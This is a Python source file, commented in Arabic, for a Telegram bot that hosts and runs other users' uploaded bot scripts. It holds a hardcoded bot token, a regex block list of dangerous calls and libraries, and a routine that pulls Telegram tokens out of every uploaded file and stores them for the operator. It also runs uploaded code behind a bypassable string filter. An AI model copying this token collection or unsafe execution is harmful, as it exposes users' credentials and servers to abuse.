import telebot
from telebot import types
import os
import subprocess
import time
import threading
import sqlite3
import logging
import traceback
import re
import ast
import importlib
import tempfile
import shutil
from datetime import datetime, timedelta
import requests
import sys

# إعدادات التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

TOKEN = "8125153556:AAETI_EUr00QbH1eK4l0qEUtDIb1FQDTLeA"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# مسارات متوافقة مع Render
UPLOAD_FOLDER = "uploaded_files"
DB_FILE = "bot_data.db"
ANALYSIS_FOLDER = "file_analysis"
TOKENS_FOLDER = "tokens_data"

# إنشاء المجلدات إذا لم تكن موجودة
for folder in [UPLOAD_FOLDER, ANALYSIS_FOLDER, TOKENS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# قائمة بالمكتبات الخطرة
DANGEROUS_LIBRARIES = [
    'os', 'sys', 'subprocess', 'shutil', 'ctypes', 'socket', 
    'paramiko', 'ftplib', 'urllib', 'requests', 'selenium',
    'scrapy', 'mechanize', 'webbrowser', 'pyautogui', 'pynput'
]

# قائمة بأنماط الهجمات المعروفة
MALICIOUS_PATTERNS = [
    r"eval\s*\(", r"exec\s*\(", r"__import__\s*\(", r"open\s*\(", 
    r"subprocess\.Popen\s*\(", r"os\.system\s*\(", r"os\.popen\s*\(",
    r"shutil\.rmtree\s*\(", r"os\.remove\s*\(", r"os\.unlink\s*\(",
    r"requests\.(get|post)\s*\(", r"urllib\.request\.urlopen\s*\(",
    r"while True:", r"fork\s*\(", r"pty\s*\(", r"spawn\s*\("
]

running_processes = {}
developer = "@xtt19x"
DEVELOPER_ID = 6521966233

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    try:
        # إنشاء جميع الجداول
        tables = [
            '''CREATE TABLE IF NOT EXISTS files
            (id INTEGER PRIMARY KEY, filename TEXT, user_id INTEGER, 
             upload_time TIMESTAMP, status TEXT, analysis_result TEXT,
             token TEXT, libraries TEXT)''',
            
            '''CREATE TABLE IF NOT EXISTS admins
            (id INTEGER PRIMARY KEY, user_id INTEGER UNIQUE, 
             added_by INTEGER, added_time TIMESTAMP)''',
            
            '''CREATE TABLE IF NOT EXISTS banned_users
            (id INTEGER PRIMARY KEY, user_id INTEGER UNIQUE, 
             banned_by INTEGER, ban_time TIMESTAMP, reason TEXT)''',
            
            '''CREATE TABLE IF NOT EXISTS force_subscribe
            (id INTEGER PRIMARY KEY, channel_id TEXT UNIQUE, 
             channel_username TEXT, added_by INTEGER, added_time TIMESTAMP)''',
            
            '''CREATE TABLE IF NOT EXISTS bot_settings
            (id INTEGER PRIMARY KEY, setting_key TEXT UNIQUE, 
             setting_value TEXT)''',
            
            '''CREATE TABLE IF NOT EXISTS file_analysis
            (id INTEGER PRIMARY KEY, filename TEXT, user_id INTEGER, 
             analysis_time TIMESTAMP, issues_found INTEGER,
             dangerous_libs TEXT, malicious_patterns TEXT,
             file_size INTEGER, lines_of_code INTEGER)''',
            
            '''CREATE TABLE IF NOT EXISTS security_settings
            (id INTEGER PRIMARY KEY, setting_key TEXT UNIQUE, 
             setting_value TEXT, description TEXT)''',
            
            '''CREATE TABLE IF NOT EXISTS vip_users
            (id INTEGER PRIMARY KEY, user_id INTEGER UNIQUE, 
             activated_by INTEGER, activation_time TIMESTAMP,
             expiry_date TIMESTAMP, status TEXT)''',
            
            '''CREATE TABLE IF NOT EXISTS blocked_libraries
            (id INTEGER PRIMARY KEY, library_name TEXT UNIQUE, 
             blocked_by INTEGER, block_time TIMESTAMP, reason TEXT)'''
        ]
        
        for table in tables:
            cursor.execute(table)
        
        # إضافة الإعدادات الافتراضية
        default_settings = [
            ('free_mode', 'enabled'),
            ('paid_mode', 'disabled'),
            ('bot_status', 'enabled')
        ]
        
        for setting in default_settings:
            cursor.execute("INSERT OR IGNORE INTO bot_settings (setting_key, setting_value) VALUES (?, ?)", setting)
        
        # إعدادات الأمان الافتراضية
        default_security_settings = [
            ('auto_scan_files', 'true', 'فحص الملفات تلقائياً قبل الرفع'),
            ('block_dangerous_libs', 'true', 'منع المكتبات الخطرة'),
            ('notify_on_threat', 'true', 'الإشعار عند اكتشاف تهديد'),
            ('max_file_size', '5120', 'أقصى حجم للملف بالكيلوبايت (5120 = 5MB)'),
            ('allowed_file_types', 'py,txt,json', 'أنواع الملفات المسموحة'),
            ('cleanup_interval', '24', 'فترة تنظيف الملفات بالساعات'),
            ('vip_mode', 'false', 'تفعيل وضع VIP'),
            ('auto_install_libs', 'false', 'تثبيت المكتبات تلقائياً')
        ]
        
        for setting in default_security_settings:
            cursor.execute('''INSERT OR IGNORE INTO security_settings 
                            (setting_key, setting_value, description) 
                            VALUES (?, ?, ?)''', setting)
        
        # إضافة المطور كأدمن تلقائياً
        cursor.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_time) VALUES (?, ?, ?)',
                      (DEVELOPER_ID, DEVELOPER_ID, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        conn.commit()
        logger.info("✅ تم إنشاء/تهيئة قاعدة البيانات بنجاح")
        
    except Exception as e:
        logger.error(f"❌ خطأ في إنشاء قاعدة البيانات: {e}")
        conn.rollback()
    finally:
        conn.close()

def db_execute(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    try:
        cursor.execute(query, params)
        conn.commit()
    except Exception as e:
        logger.error(f"خطأ في تنفيذ الاستعلام: {e}")
        conn.rollback()
    finally:
        conn.close()

def db_fetchone(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    result = cursor.fetchone()
    conn.close()
    return result

def db_fetchall(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    result = cursor.fetchall()
    conn.close()
    return result

def is_admin(user_id):
    result = db_fetchone("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
    return result is not None or user_id == DEVELOPER_ID

def is_vip(user_id):
    result = db_fetchone("SELECT user_id FROM vip_users WHERE user_id = ? AND status = 'active'", (user_id,))
    return result is not None

def bot_enabled():
    result = db_fetchone("SELECT setting_value FROM bot_settings WHERE setting_key = 'bot_status'")
    return result and result[0] == 'enabled'

def is_paid_mode():
    result = db_fetchone("SELECT setting_value FROM bot_settings WHERE setting_key = 'paid_mode'")
    return result and result[0] == 'enabled'

def is_vip_mode():
    result = db_fetchone("SELECT setting_value FROM security_settings WHERE setting_key = 'vip_mode'")
    return result and result[0] == 'true'

def check_subscription(user_id):
    channels = db_fetchall("SELECT channel_id, channel_username FROM force_subscribe")
    if not channels:
        return True, ""
    
    missing_channels = []
    for channel in channels:
        channel_id, channel_username = channel
        try:
            member = bot.get_chat_member(channel_id, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                missing_channels.append(channel_username)
        except Exception as e:
            logger.error(f"Error checking subscription: {e}")
            missing_channels.append(channel_username)
    
    if missing_channels:
        return False, missing_channels
    return True, ""

def get_security_setting(setting_key):
    result = db_fetchone("SELECT setting_value FROM security_settings WHERE setting_key = ?", (setting_key,))
    return result[0] if result else None

def extract_token_from_file(file_path):
    """استخراج التوكن من ملف البايثون"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # البحث عن التوكن بأنماط مختلفة
        patterns = [
            r'bot\.TeleBot\(["\']([^"\']+)["\']\)',
            r'telebot\.TeleBot\(["\']([^"\']+)["\']\)',
            r'TOKEN\s*=\s*["\']([^"\']+)["\']',
            r'token\s*=\s*["\']([^"\']+)["\']',
            r'["\']([0-9]{8,10}:[a-zA-Z0-9_-]{35})["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                return match.group(1)
        
        return None
    except Exception as e:
        logger.error(f"خطأ في استخراج التوكن: {e}")
        return None

def save_token_to_file(filename, token, user_id):
    """حفظ التوكن في ملف منفصل"""
    try:
        token_file = os.path.join(TOKENS_FOLDER, f"{filename}_token.txt")
        with open(token_file, 'w', encoding='utf-8') as f:
            f.write(f"File: {filename}\n")
            f.write(f"User ID: {user_id}\n")
            f.write(f"Token: {token}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        return True
    except Exception as e:
        logger.error(f"خطأ في حفظ التوكن: {e}")
        return False

def analyze_file(file_path, filename, user_id):
    """تحليل الملف لاكتشاف المشاكل والمخاطر الأمنية"""
    analysis_result = {
        'issues_found': 0,
        'dangerous_libs': [],
        'malicious_patterns': [],
        'file_size': 0,
        'lines_of_code': 0,
        'syntax_errors': False,
        'status': 'safe',
        'libraries': [],
        'token_found': False,
        'token': None
    }
    
    try:
        # الحصول على حجم الملف
        file_size = os.path.getsize(file_path)
        analysis_result['file_size'] = file_size
        
        # التحقق من حجم الملف
        max_size = int(get_security_setting('max_file_size') or 5120)
        if file_size > max_size * 1024:
            analysis_result['issues_found'] += 1
            analysis_result['status'] = 'too_large'
            return analysis_result
        
        # قراءة محتوى الملف
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # حساب عدد الأسطر
        lines = content.split('\n')
        analysis_result['lines_of_code'] = len(lines)
        
        # استخراج التوكن
        token = extract_token_from_file(file_path)
        if token:
            analysis_result['token_found'] = True
            analysis_result['token'] = token
            save_token_to_file(filename, token, user_id)
        
        # البحث عن المكتبات المستخدمة
        lib_pattern = r'^\s*import\s+(\w+)|^\s*from\s+(\w+)\s+import'
        libraries = re.findall(lib_pattern, content, re.MULTILINE)
        for lib in libraries:
            lib_name = lib[0] or lib[1]
            if lib_name and lib_name not in analysis_result['libraries']:
                analysis_result['libraries'].append(lib_name)
        
        # التحقق من الأخطاء النحوية
        try:
            ast.parse(content)
        except SyntaxError as e:
            analysis_result['syntax_errors'] = True
            analysis_result['issues_found'] += 1
            analysis_result['status'] = 'syntax_error'
            return analysis_result
        
        # البحث عن المكتبات الخطرة
        for lib in DANGEROUS_LIBRARIES:
            if re.search(rf'^\s*import\s+{lib}\s*$|^\s*from\s+{lib}\s+import', content, re.MULTILINE):
                analysis_result['dangerous_libs'].append(lib)
                analysis_result['issues_found'] += 1
        
        # البحث عن أنماط الهجمات
        for pattern in MALICIOUS_PATTERNS:
            if re.search(pattern, content):
                analysis_result['malicious_patterns'].append(pattern)
                analysis_result['issues_found'] += 1
        
        # تحديد حالة الملف بناءً على النتائج
        if analysis_result['issues_found'] > 0:
            analysis_result['status'] = 'suspicious'
        
        # حفظ نتائج التحليل في قاعدة البيانات
        dangerous_libs_str = ','.join(analysis_result['dangerous_libs'])
        malicious_patterns_str = ','.join(analysis_result['malicious_patterns'])
        libraries_str = ','.join(analysis_result['libraries'])
        
        db_execute('''INSERT INTO file_analysis 
                     (filename, user_id, analysis_time, issues_found, dangerous_libs, 
                      malicious_patterns, file_size, lines_of_code)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (filename, user_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                   analysis_result['issues_found'], dangerous_libs_str, 
                   malicious_patterns_str, file_size, len(lines)))
        
        # تحديث جدول الملفات بالمكتبات والتوكن
        db_execute('''UPDATE files SET libraries = ?, token = ? WHERE filename = ?''',
                  (libraries_str, token, filename))
        
    except Exception as e:
        logger.error(f"خطأ في تحليل الملف: {e}")
        analysis_result['status'] = 'analysis_error'
    
    return analysis_result

def install_libraries(libraries):
    """تثبيت المكتبات المطلوبة - محدود على Render"""
    results = []
    for lib in libraries:
        try:
            # تجنب تثبيت مكتبات خطرة
            if lib in DANGEROUS_LIBRARIES:
                results.append(f"❌ لا يمكن تثبيت {lib} (مكتبة خطرة)")
                continue
                
            # محاولة الاستيراد للتحقق من وجود المكتبة
            try:
                importlib.import_module(lib)
                results.append(f"✅ {lib} مثبتة مسبقاً")
            except ImportError:
                results.append(f"⚠️ {lib} تحتاج تثبيت يدوي")
        except Exception as e:
            results.append(f"❌ فشل التحقق من {lib}: {str(e)}")
    return results

def safe_run_file(file_path):
    """تشغيل الملف بطريقة آمنة"""
    try:
        # قراءة المحتوى أولاً للتحقق
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # التحقق من عدم وجود أوامر خطرة
        dangerous_commands = ['os.system', 'subprocess.call', 'subprocess.Popen', 'eval', 'exec']
        for cmd in dangerous_commands:
            if cmd in content:
                return None, f"❌ الملف يحتوي على أوامر خطرة: {cmd}"
        
        # محاولة تشغيل الملف في عملية منفصلة
        process = subprocess.Popen([sys.executable, file_path], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE,
                                 text=True)
        
        # انتظار قليل لبدء التشغيل
        time.sleep(2)
        
        # التحقق من أن العملية لا تزال تعمل
        if process.poll() is None:
            return process, "✅ تم تشغيل الملف بنجاح"
        else:
            # الحصول على خطأ التشغيل
            stdout, stderr = process.communicate()
            return None, f"❌ فشل التشغيل: {stderr}"
            
    except Exception as e:
        return None, f"❌ خطأ في التشغيل: {str(e)}"

def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)

    btn_upload = types.InlineKeyboardButton("📤 رفع ملف", callback_data="upload")
    btn_delete = types.InlineKeyboardButton("🗑 حذف ملف", callback_data="delete_file")
    btn_install = types.InlineKeyboardButton("📦 تحميل مكتبة", callback_data="install_lib")
    btn_create = types.InlineKeyboardButton("🤖 إنشاء بوت", callback_data="make_bot")
    btn_stop = types.InlineKeyboardButton("⛔ إيقاف بوت", callback_data="stop_one")
    btn_start = types.InlineKeyboardButton("🟢 تشغيل بوت", callback_data="start_one")
    btn_myfiles = types.InlineKeyboardButton("📂 ملفاتي", callback_data="list_files")
    btn_admin = types.InlineKeyboardButton("👨‍💻 لوحة الأدمن", callback_data="admin_panel")
    btn_analysis = types.InlineKeyboardButton("🔍 تحليل الملفات", callback_data="analysis_tools")
    btn_stats = types.InlineKeyboardButton("📊 إحصائياتي", callback_data="user_stats")
    btn_help = types.InlineKeyboardButton("❓ تعليمات", callback_data="user_help")
    btn_stop_all = types.InlineKeyboardButton("⛔ إيقاف الكل", callback_data="stop_all_files")
    btn_dev = types.InlineKeyboardButton("💼 المطور", url=f"https://t.me/{developer[1:]}")
    
    markup.add(btn_upload, btn_delete)
    markup.add(btn_install, btn_create)
    markup.add(btn_stop, btn_start)
    markup.add(btn_myfiles, btn_admin)
    markup.add(btn_analysis, btn_stats)
    markup.add(btn_help, btn_stop_all)
    markup.add(btn_dev)
    
    return markup

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    logger.info(f"📩 استلام /start من المستخدم: {user_id}")
    
    if not bot_enabled():
        bot.send_message(message.chat.id, "⛔ البوت معطل حاليًا. يرجى المحاولة لاحقًا.")
        return
    
    # التحقق من وضع VIP
    if is_vip_mode() and not is_vip(user_id) and not is_admin(user_id):
        bot.send_message(message.chat.id, 
                        "⭐ هذا البوت يعمل بوضع VIP حاليًا.\n\n"
                        "يرجى التواصل مع المطور للاشتراك والاستفادة من خدمات البوت.\n"
                        f"المطور: {developer}")
        return
    
    if is_paid_mode() and not is_admin(user_id):
        bot.send_message(message.chat.id, 
                        "💳 هذا البوت يعمل بالوضع المدفوع حاليًا.\n\n"
                        "يرجى التواصل مع المطور للاشتراك والاستفادة من خدمات البوت.\n"
                        f"المطور: {developer}")
        return
    
    # التحقق من الاشتراك في القنوات
    subscribed, missing_channels = check_subscription(user_id)
    if not subscribed:
        markup = types.InlineKeyboardMarkup()
        for channel in missing_channels:
            btn = types.InlineKeyboardButton(f"انضم هنا {channel}", url=f"https://t.me/{channel[1:]}")
            markup.add(btn)
        
        btn_check = types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")
        markup.add(btn_check)
        
        bot.send_message(message.chat.id, 
                        "📢 يرجى الاشتراك في القنوات التالية لاستخدام البوت:",
                        reply_markup=markup)
        return
    
    # إظهار رسالة ترحيبية
    welcome_msg = "👋 أهلاً بك في <b>مدير البوتات المتطور</b>!\n\n🔽 استخدم الأزرار للتحكم:"
    
    if is_admin(user_id):
        welcome_msg += "\n\n👨‍💻 يمكنك الوصول إلى لوحة الأدمن من الزر أدناه"
    
    bot.send_message(message.chat.id, welcome_msg, reply_markup=main_menu())

@bot.message_handler(commands=["test"])
def test_command(message):
    """أمر اختبار للتأكد من أن البوت يستجيب"""
    user_id = message.from_user.id
    logger.info(f"🧪 اختبار من المستخدم: {user_id}")
    
    bot.reply_to(message, "✅ البوت يعمل بنجاح! هذه رسالة اختبار.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        user_id = message.from_user.id
        
        if not bot_enabled():
            bot.send_message(message.chat.id, "⛔ البوت معطل حاليًا.")
            return
        
        # التحقق من وضع VIP
        if is_vip_mode() and not is_vip(user_id) and not is_admin(user_id):
            bot.send_message(message.chat.id, 
                          "⭐ هذا البوت يعمل بوضع VIP حاليًا.\n\n"
                          "يرجى التواصل مع المطور للاشتراك والاستفادة من خدمات البوت.\n"
                          f"المطور: {developer}")
            return
        
        if is_paid_mode() and not is_admin(user_id):
            bot.send_message(message.chat.id, 
                          "💳 هذا البوت يعمل بالوضع المدفوع حاليًا.\n\n"
                          "يرجى التواصل مع المطور للاشتراك والاستفادة من خدمات البوت.\n"
                          f"المطور: {developer}")
            return
        
        # التحقق من الاشتراك
        subscribed, missing_channels = check_subscription(user_id)
        if not subscribed:
            markup = types.InlineKeyboardMarkup()
            for channel in missing_channels:
                btn = types.InlineKeyboardButton(f"انضم هنا {channel}", url=f"https://t.me/{channel[1:]}")
                markup.add(btn)
            
            btn_check = types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")
            markup.add(btn_check)
            
            bot.send_message(message.chat.id, 
                          "📢 يرجى الاشتراك في القنوات التالية لاستخدام البوت:",
                          reply_markup=markup)
            return
        
        document = message.document
        file_name = document.file_name
        
        # التحقق من نوع الملف
        allowed_types = (get_security_setting('allowed_file_types') or 'py,txt,json').split(',')
        file_ext = file_name.split('.')[-1].lower()
        
        if file_ext not in allowed_types:
            bot.reply_to(message, f"❌ نوع الملف غير مسموح. الأنواع المسموحة: {', '.join(allowed_types)}")
            return
        
        # التحقق من حجم الملف
        max_size = int(get_security_setting('max_file_size') or 5120)
        if document.file_size > max_size * 1024:
            bot.reply_to(message, f"❌ حجم الملف كبير جداً. الحد الأقصى: {max_size}KB")
            return
        
        # إرسال رسالة بدء التحميل
        progress_msg = bot.reply_to(message, f"📤 جاري رفع الملف: {file_name}...")
        
        # تحميل الملف
        file_info = bot.get_file(document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        file_path = os.path.join(UPLOAD_FOLDER, file_name)
        counter = 1
        original_name = file_name
        
        while os.path.exists(file_path):
            name, ext = os.path.splitext(original_name)
            file_name = f"{name}_{counter}{ext}"
            file_path = os.path.join(UPLOAD_FOLDER, file_name)
            counter += 1
        
        with open(file_path, "wb") as f:
            f.write(downloaded)
        
        # تحليل الملف
        analysis = analyze_file(file_path, file_name, user_id)
        
        # تثبيت المكتبات
        auto_install = get_security_setting('auto_install_libs') == 'true'
        if auto_install and analysis['libraries']:
            install_results = install_libraries(analysis['libraries'])
            install_summary = "\n".join(install_results)
        else:
            install_summary = "⚠️ التثبيت التلقائي معطل"
        
        # حفظ المعلومات في قاعدة البيانات
        libraries_str = ','.join(analysis['libraries'])
        db_execute("INSERT INTO files (filename, user_id, upload_time, status, libraries, token) VALUES (?, ?, ?, ?, ?, ?)",
                 (file_name, user_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 'stopped', libraries_str, analysis['token']))
        
        # إعداد رسالة النتيجة
        result_msg = f"✅ <b>تم رفع الملف بنجاح!</b>\n\n"
        result_msg += f"📁 <b>الاسم:</b> {file_name}\n"
        result_msg += f"📏 <b>الحجم:</b> {analysis['file_size']} بايت\n"
        result_msg += f"📝 <b>الأسطر:</b> {analysis['lines_of_code']}\n"
        result_msg += f"📚 <b>المكتبات:</b> {len(analysis['libraries'])}\n"
        
        if analysis['token_found']:
            result_msg += f"🔑 <b>التوكن:</b> تم اكتشافه وتخزينه\n"
        
        result_msg += f"\n📦 <b>تثبيت المكتبات:</b>\n{install_summary}\n\n"
        
        # تشغيل الملف إذا كان من نوع py
        if file_name.endswith(".py"):
            process, run_result = safe_run_file(file_path)
            
            if process:
                running_processes[file_name] = process
                db_execute("UPDATE files SET status = 'active' WHERE filename = ? AND user_id = ?", (file_name, user_id))
                result_msg += f"🟢 <b>تم تشغيل البوت بنجاح</b>\n"
            else:
                result_msg += f"🔴 <b>لم يتم التشغيل:</b> {run_result}\n"
        
        result_msg += "⚙️ <b>تم حفظ الملف بنجاح!</b>"
        
        bot.edit_message_text(result_msg, message.chat.id, progress_msg.message_id)
        
        # إرسال إشعار للمطور
        if user_id != DEVELOPER_ID:
            file_size = document.file_size // 1024
            status = "🟢 شغال" if file_name in running_processes else "🔴 متوقف"
            user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name} ({user_id})"
            
            bot.send_message(
                DEVELOPER_ID,
                f"📤 تم رفع ملف جديد!\n\n"
                f"• اسم الملف: {file_name}\n"
                f"• الحجم: {file_size} KB\n"
                f"• الحالة: {status}\n"
                f"• من: {user_info}\n"
                f"• المكتبات: {libraries_str}"
            )
                
    except Exception as e:
        logger.error(f"حدث خطأ أثناء معالجة الملف: {str(e)}")
        bot.reply_to(message, f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة جميع الرسائل النصية"""
    user_id = message.from_user.id
    logger.info(f"📝 رسالة من {user_id}: {message.text}")
    
    bot.reply_to(message, 
                f"📝 **تلقيت رسالتك:**\n\n`{message.text}`\n\n"
                "استخدم /start لرؤية القائمة الرئيسية أو /test لاختبار البوت.")

def cleanup_old_files():
    """تنظيف الملفات القديمة تلقائياً"""
    try:
        # حذف الملفات الأقدم من 24 ساعة
        cutoff_time = datetime.now() - timedelta(hours=24)
        cutoff_str = cutoff_time.strftime("%Y-%m-%d %H:%M:%S")
        
        old_files = db_fetchall("SELECT filename FROM files WHERE upload_time < ?", (cutoff_str,))
        
        for file in old_files:
            filename = file[0]
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            
            # إيقاف العملية إذا كانت شغالة
            if filename in running_processes:
                running_processes[filename].terminate()
                del running_processes[filename]
            
            # حذف الملف
            if os.path.exists(file_path):
                os.remove(file_path)
        
        # حذف من قاعدة البيانات
        db_execute("DELETE FROM files WHERE upload_time < ?", (cutoff_str,))
        
        if old_files:
            logger.info(f"🧹 تم تنظيف {len(old_files)} ملف قديم")
    except Exception as e:
        logger.error(f"خطأ في التنظيف التلقائي: {e}")

def start_cleanup_scheduler():
    """بدء خدمة التنظيف التلقائي"""
    def cleanup_loop():
        while True:
            cleanup_old_files()
            time.sleep(3600)  # كل ساعة
    
    thread = threading.Thread(target=cleanup_loop, daemon=True)
    thread.start()

def run_bot_polling():
    """تشغيل البوت باستخدام polling"""
    logger.info("🔄 بدء تشغيل البوت باستخدام polling...")
    
    while True:
        try:
            logger.info("✅ البوت يعمل وجاهز لاستقبال الرسائل...")
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"❌ خطأ في البوت: {str(e)}")
            logger.info("🔄 إعادة التشغيل بعد 10 ثواني...")
            time.sleep(10)

if __name__ == "__main__":
    # اختبار التوكن أولاً
    try:
        bot_info = bot.get_me()
        logger.info(f"✅ التوكن صحيح! البوت: @{bot_info.username}")
        logger.info(f"👤 اسم البوت: {bot_info.first_name}")
    except Exception as e:
        logger.error(f"❌ التوكن غير صحيح: {e}")
        exit(1)
    
    # تهيئة قاعدة البيانات
    init_db()
    
    logger.info("🚀 البوت يعمل الآن على Render...")
    
    # بدء خدمة التنظيف التلقائي
    start_cleanup_scheduler()
    
    # تشغيل البوت باستخدام polling
    run_bot_polling()
